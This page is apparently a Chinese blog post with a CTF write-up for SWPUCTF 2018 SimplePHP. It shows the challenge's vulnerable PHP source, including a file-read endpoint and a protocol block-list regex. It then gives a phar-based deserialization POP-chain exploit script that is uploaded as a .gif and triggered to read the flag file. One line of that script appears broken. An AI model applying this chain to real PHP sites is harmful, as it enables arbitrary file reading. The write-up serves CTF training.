@@ -1,0 +1,275 @@
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>SWPUCTF 2018 SimplePHP_0x50-0x5F | sakura</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="sakura" type="application/atom+xml">
+</head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
+</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">sakura</a></h1></div><p class="m-desc">那就祝我们有讲不完的笑话和数不尽的浪漫</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">SWPUCTF 2018 SimplePHP_0x50-0x5F</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/">2021-11-07</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF/">CTF</a>&nbsp;&bull;&nbsp;<a href="/categories/CTF/%E5%88%B7%E9%A2%98/">刷题</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><p>如图，只有两个功能点，查看文件和上传文件</p>
+<p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107215628202.png" alt="image-20211107215628202"></p>
+<p>上传文件功能点只能上传图片。</p>
+<p>点击查看链接观察url</p>
+<p><a target="_blank" rel="noopener" href="http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=">http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=</a></p>
+<p>尝试在file后加一些东西</p>
+<p><a target="_blank" rel="noopener" href="http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=index.php">http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=index.php</a></p>
+<p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107215818863.png" alt="image-20211107215818863"></p>
+<p>surprise!</p>
+<p>继续，依次读取各个页面的源码</p>
+<p>file.php</p>
+<pre><code class="php">&lt;?php 
+header(&quot;content-type:text/html;charset=utf-8&quot;);  
+include &#39;function.php&#39;; 
+include &#39;class.php&#39;; 
+ini_set(&#39;open_basedir&#39;,&#39;/var/www/html/&#39;); 
+$file = $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; 
+if(empty($file)) &#123; 
+    echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; 
+&#125; 
+$show = new Show(); 
+if(file_exists($file)) &#123; 
+    $show-&gt;source = $file; 
+    $show-&gt;_show(); 
+&#125; else if (!empty($file))&#123; 
+    die(&#39;file doesn\&#39;t exists.&#39;); 
+&#125; 
+?&gt; 
+</code></pre>
+<p>function.php</p>
+<pre><code class="php">&lt;?php 
+//show_source(__FILE__); 
+include &quot;base.php&quot;; 
+header(&quot;Content-type: text/html;charset=utf-8&quot;); 
+error_reporting(0); 
+function upload_file_do() &#123; 
+    global $_FILES; 
+    $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; 
+    //mkdir(&quot;upload&quot;,0777); 
+    if(file_exists(&quot;upload/&quot; . $filename)) &#123; 
+        unlink($filename); 
+    &#125; 
+    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); 
+    echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#39;; 
+&#125; 
+function upload_file() &#123; 
+    global $_FILES; 
+    if(upload_file_check()) &#123; 
+        upload_file_do(); 
+    &#125; 
+&#125; 
+function upload_file_check() &#123; 
+    global $_FILES; 
+    $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); 
+    $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); 
+    $extension = end($temp); 
+    if(empty($extension)) &#123; 
+        //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; 
+    &#125; 
+    else&#123; 
+        if(in_array($extension,$allowed_types)) &#123; 
+            return true; 
+        &#125; 
+        else &#123; 
+            echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#39;; 
+            return false; 
+        &#125; 
+    &#125; 
+&#125; 
+?&gt; 
+</code></pre>
+<p>class.php</p>
+<pre><code class="php"> &lt;?php
+class C1e4r
+&#123;
+    public $test;
+    public $str;
+    public function __construct($name)
+    &#123;
+        $this-&gt;str = $name;
+    &#125;
+    public function __destruct()
+    &#123;
+        $this-&gt;test = $this-&gt;str;
+        echo $this-&gt;test;
+    &#125;
+&#125;
+
+class Show
+&#123;
+    public $source;
+    public $str;
+    public function __construct($file)
+    &#123;
+        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg
+        echo $this-&gt;source;
+    &#125;
+    public function __toString()
+    &#123;
+        $content = $this-&gt;str[&#39;str&#39;]-&gt;source;
+        return $content;
+    &#125;
+    public function __set($key,$value)
+    &#123;
+        $this-&gt;$key = $value;
+    &#125;
+    public function _show()
+    &#123;
+        if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;,$this-&gt;source)) &#123;
+            die(&#39;hacker!&#39;);
+        &#125; else &#123;
+            highlight_file($this-&gt;source);
+        &#125;
+        &#125;
+public function __wakeup()
+&#123;
+    if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;
+        echo &quot;hacker~&quot;;
+        $this-&gt;source = &quot;index.php&quot;;
+    &#125;
+&#125;
+&#125;
+class Test
+&#123;
+    public $file;
+    public $params;
+    public function __construct()
+    &#123;
+        $this-&gt;params = array();
+    &#125;
+    public function __get($key)
+    &#123;
+        return $this-&gt;get($key);
+    &#125;
+    public function get($key)
+    &#123;
+        if(isset($this-&gt;params[$key])) &#123;
+            $value = $this-&gt;params[$key];
+        &#125; else &#123;
+            $value = &quot;index.php&quot;;
+        &#125;
+        return $this-&gt;file_get($value);
+    &#125;
+    public function file_get($value)
+    &#123;
+        $text = base64_encode(file_get_contents($value));
+        return $text;
+    &#125;
+&#125;
+?&gt;
+</code></pre>
+<p>首先观察敏感函数，我们发现了file_get_contents()，如何利用它呢，我们尝试寻找可以反序列的点。</p>
+<p>但是本文中并没unserialize，这时候我们就可以采用phar://协议，可以达到反序列化的效果。</p>
+<p>下面我们就要考虑，如何利用file_get_contens()这个敏感函数。</p>
+<p>反序列化，最重要的就算里面的一些魔术方法，我们可以进行调用。</p>
+<p>__toString  在echo一个类的时候调用</p>
+<p>__get   未定义的属性或没有权限访问的属性被访问时该方法会被调用</p>
+<p>下面我们来尝试构建pop利用链。</p>
+<p>我们全局搜索$value这个变量，发现它是由get穿过来的</p>
+<p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107220543645.png" alt="image-20211107220543645"></p>
+<p> 我们的目标是什么呢？</p>
+<p>使$value可控！</p>
+<p>我们再全局搜索$key并没有发现可以传入的地方，那么说明它不受我们控制。</p>
+<p>那我们就要突破这个点。</p>
+<p>如何构造，使它受我们控制。</p>
+<p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107220958104.png" alt="image-20211107220958104"></p>
+<p>我们可以使用这个魔术方法：</p>
+<p>当我们在Test()这个类中调用一个不存在的属性的时候就会调用它，因此我们可以通过这个方法来传入我们想要的东西。</p>
+<p>那么如何调用Test()呢？</p>
+<p>我们可以发现：</p>
+<p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107221351753.png" alt="image-20211107221351753"></p>
+<p>Test()类中不存在source，我们可以令str[‘str’] = new Test() 来调用。</p>
+<p>而调用__toString，又需要echo这个类</p>
+<p>我们可以利用这里</p>
+<p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107221800425.png" alt="image-20211107221800425"></p>
+<p>好了，上面我们都是逆推，现在我们可以理一下pop链的顺序。</p>
+<p>调用C1e4r()中的魔术方法__destruct  ——-    调用Show()中的 toString()  ———     传入Test调用不存在的属性从而调用 get</p>
+<p>pop链代码如下:</p>
+<pre><code class="php"> &lt;?php
+class C1e4r
+&#123;
+    public $test;
+    public $str;
+&#125;
+
+class Show
+&#123;
+    public $source;
+    public $str;
+&#125;
+
+class Test
+&#123;
+    public $file;
+    public $params;
+&#125;
+
+
+$a = new C1e4r();
+$b = new Show();
+$c = new Test();
+$a-&gt;str = $b;
+$b-&gt;str[&#39;str&#39;] = $c; //因为这里会调用source,从而会调用下边的source，所以下边的params也要接受$source
+$this-&gt;params[$source] = &#39;/var/www/html/f1ag.php&#39;;
+
+@unlink(&quot;sakura.phar&quot;);
+
+$phar = new Phar(&quot;sakura.phar&quot;); //后缀名必须为phar
+
+$phar-&gt;startBuffering(); //开始缓冲 Phar 写操作
+
+$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub
+
+$phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest
+
+$phar-&gt;addFromString(&quot;sakura.txt&quot;, &quot;sakura&quot;); //添加要压缩的文件
+
+//签名自动计算
+
+$phar-&gt;stopBuffering();
+
+?&gt;
+</code></pre>
+<p>放在本地环境，访问，会生成一个sakura.phar文件</p>
+<p>发现无法上传，将后缀改为.gif</p>
+<p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107223436308.png" alt="image-20211107223436308"></p>
+<p>上传后。</p>
+<p>访问</p>
+<p><a target="_blank" rel="noopener" href="http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/upload%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%BE%97%E6%96%87%E4%BB%B6%E5%90%8D">http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/upload可以获得文件名</a></p>
+<p>然后利用phar解析</p>
+<p><a target="_blank" rel="noopener" href="http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=phar://upload/c8875103fcefc5560e4783a36e5faa18.jpg">http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=phar://upload/c8875103fcefc5560e4783a36e5faa18.jpg</a></p>
+<p>获得flag</p>
+<p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107223535835.png" alt="image-20211107223535835"></p>
+<p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107223555802.png" alt="image-20211107223555802"></p>
+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">John Doe</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/">https://sakurahack-y.github.io/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://sakurahack-y.github.io">John Doe的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tags"></i><a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a><a href="/tags/phar%E5%8D%8F%E8%AE%AE/">phar协议</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/">CISCN2019 华北赛区 Day1 Web1 Dropbox _0x41-0x4F &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
+.night .v[data-class=v] a:hover { color: #216C73 !important; }
+.night .v[data-class=v] li { list-style: inherit; }
+.night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
+.night .v[data-class=v] .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
+.night .v[data-class=v] .vbtn { border-radius: 0; background: none; }
+.night .v[data-class=v] .vlist .vcard .vh { border-bottom-color: #293D4E; }
+.night .v[data-class=v] .vwrap .vheader .vinput { border-bottom-color: #223441; }
+.night .v[data-class=v] .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre,.night .v[data-class=v] .vlist .vcard .vhead .vsys { background: #203240 !important; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre { color: #F0F0F0; font-size: 95%; }
+.v[data-class=v] .vcards .vcard .vh {border-bottom-color: #223441; }
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:before {background: linear-gradient(180deg,rgba(38,57,73,.4),rgba(38,57,73,.9));}
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:after {background: rgba(38,57,73,.9)}
+</style><div id="vcomment"></div><script src="//cdn.bootcdn.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'',
+  appKey:'',
+  lang: 'zh-cn',
+  placeholder:'ヾﾉ≧∀≦)o Come on, say something...',
+  avatar:'identicon',
+  guest_info:guest_info,
+  pageSize:'10'
+})</script></div></section><footer><p>Copyright © 2016 - 2021 <a href="/." rel="nofollow">sakura</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
+if (search_path.length == 0) {
+    search_path = 'search.xml';
+}
+var path = '/' + search_path;
+searchFunc(path, 'local-search-input', 'local-search-result');
+</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>
